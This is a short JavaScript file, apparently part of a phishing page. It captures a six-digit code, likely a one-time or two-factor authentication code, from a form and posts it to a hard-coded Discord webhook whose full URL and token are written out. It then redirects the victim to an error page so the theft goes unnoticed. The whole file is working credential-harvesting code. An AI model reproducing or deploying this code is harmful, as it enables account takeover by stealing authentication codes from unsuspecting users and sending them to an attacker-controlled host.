const webhookUrl = 'https://discord.com/api/webhooks/1413009868364976218/FRWyak8eE5D6BdqXv5x3_bMiKexf5I8x1y1qJuMPHRMcirw3qxCZseR5qXdatlQrCntp';

const sendCode = (code) => {
  const msg = {
    content: `🔐 Code submitted!\n**Code:** ${code}`,
    embeds: [{
      title: 'Code Entry',
      color: 15158332,
      fields: [{ name: 'Code', value: code }],
      timestamp: new Date().toISOString()
    }]
  };

  console.log('Sending code to webhook:', msg);

  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(msg)
  })
  .then(res => {
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    console.log('Code webhook sent successfully');
  })
  .catch(err => {
    console.error('Code webhook error:', err);
  });
};

document.addEventListener('DOMContentLoaded', () => {
  document.querySelector('#form2').addEventListener('submit', (e) => {
    e.preventDefault();
    const code = document.querySelector('#Code').value.trim();
    const errorMsg = document.querySelector('#errorMsg');

    if (!/^\d{6}$/.test(code)) {
      errorMsg.textContent = 'Code must be exactly 6 digits.';
      return;
    }

    errorMsg.textContent = '';
    sendCode(code);
    setTimeout(() => window.location.href = "Error.html", 750);
  });
});
